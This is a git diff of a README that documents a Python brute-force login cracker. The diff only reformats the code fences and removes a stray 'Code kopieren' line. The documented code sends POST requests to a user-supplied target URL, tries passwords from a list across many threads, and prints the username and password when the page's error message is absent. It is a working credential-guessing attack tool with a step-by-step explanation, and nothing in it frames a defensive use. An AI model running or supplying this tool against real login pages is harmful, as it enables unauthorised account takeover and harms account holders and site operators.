@@ -4,13 +4,12 @@ This Python code attempts to brute-force a login page by iterating through a lis
 ## Code Documentation
 ### Imports:
 
-'''
-Code kopieren
+```python
 import threading
 import requests
 import time
 import sys
-'''
+```
 
 - threading: Enables multi-threaded execution, allowing multiple password attempts concurrently.
 - requests: Handles HTTP requests to the login page.
@@ -27,7 +26,7 @@ Attributes:
 
 Initialization Method:
 
-'''
+``` python
 def __init__(self, url, username, error_message):
     self.url = url
     self.username = username
@@ -37,14 +36,14 @@ def __init__(self, url, username, error_message):
         sys.stdout.write(run)
         sys.stdout.flush()
         time.sleep(0.02)
-'''
+```
 
 - Initializes the class with url, username, and error_message.
 - Displays a banner animation by printing each character sequentially.
 
 crack Method:
 
-'''
+``` python
 def crack(self, password):
     data_dict = {"LogInID": self.username, "Password": password, "Log In": "submit"}
     response = requests.post(self.url, data=data_dict)
@@ -57,7 +56,7 @@ def crack(self, password):
         print("Username: ---> " + self.username)
         print("Password: ---> " + password)
         return True
-'''
+```
 
 - Sends a POST request to the URL using requests.post with username and password.
 - Checks for error_message in the response content to identify failed attempts.
@@ -66,7 +65,7 @@ def crack(self, password):
 
 ### Helper Function: crack_passwords
 
-'''
+``` python
 def crack_passwords(passwords, cracker):
     count = 0
     for password in passwords:
@@ -75,7 +74,7 @@ def crack_passwords(passwords, cracker):
         print("Trying Password: {} Time For => {}".format(count, password))
         if cracker.crack(password):
             return
-'''
+```
 
 - Iterates over a list of passwords, incrementing a counter to track attempts.
 - Passes each password to the crack method to test if it’s correct.
@@ -83,7 +82,7 @@ def crack_passwords(passwords, cracker):
 
 ### Main Function: main
 
-'''
+``` python
 def main():
     url = input("Enter Target Url: ")
     username = input("Enter Target Username: ")
@@ -98,7 +97,7 @@ def main():
                 break
             t = threading.Thread(target=crack_passwords, args=(passwords, cracker))
             t.start()
-'''
+```
 
 - url: The target URL for the brute-force attack.
 - username: Username to test with each password.
@@ -109,7 +108,7 @@ def main():
 
 ### Execution Block
 
-'''
+``` python
 if __name__ == '__main__':
     banner = """ 
                        Checking the Server !!        
@@ -117,7 +116,7 @@ if __name__ == '__main__':
 """
     print(banner)
     main()
-'''
+```
 
 - Displays a banner before starting the brute-forcing attempts.
 - Calls the main function to begin execution.
